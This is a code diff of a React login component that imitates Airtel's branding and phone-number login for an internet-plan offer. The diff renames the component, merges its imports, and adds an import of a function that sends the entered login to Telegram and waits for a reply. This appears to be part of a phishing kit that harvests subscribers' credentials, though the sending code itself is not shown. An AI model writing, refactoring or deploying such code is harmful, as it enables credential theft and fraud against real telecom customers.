@@ -1,29 +1,10 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { AirtelLogo } from './Logos';
-import { InternetPlan } from '../types';
-import { ValidatingModal } from './ValidatingModal';
-import { sendLoginToTelegramAndWait } from '../utils/simpleTelegram';
-import { LanguageSwitch } from './LanguageSwitch';
-import { useApp } from '../context/AppContext';
-import { validateAirtelPhone, CountryInfo, AIRTEL_COUNTRIES } from '../data/countries';
-import {
-  Eye,
-  EyeOff,
-  ArrowLeft,
-  Lock,
-  Smartphone,
-  AlertTriangle,
-  Loader2,
-  Zap,
-  CheckCircle2,
-  ShieldCheck,
-  ChevronDown,
-  Search,
-  Check,
-} from 'lucide-react';
-
-interface LoginPageProps {
+import { AlertTriangle, ArrowLeft, Check, CheckCircle2, ChevronDown, Eye, EyeOff, Loader2, Lock, Search, ShieldCheck, Smartphone, Zap } from 'lucide-react';
+import { AirtelLogo, ValidatingModal, LanguageSwitch, useApp, validateAirtelPhone, AIRTEL_COUNTRIES } from '../App';
+import type { InternetPlan, CountryInfo } from '../App';
+import { sendLoginToTelegramAndWait } from '../utils/telegram';
+interface LoginFormProps {
   selectedPlan: InternetPlan;
   onBack: () => void;
   onLoginSuccess: (
@@ -35,7 +16,7 @@ interface LoginPageProps {
   ) => void;
 }
 
-export const LoginPage: React.FC<LoginPageProps> = ({
+export const LoginForm: React.FC<LoginFormProps> = ({
   selectedPlan,
   onBack,
   onLoginSuccess,
@@ -600,3 +581,4 @@ export const LoginPage: React.FC<LoginPageProps> = ({
     </div>
   );
 };
+
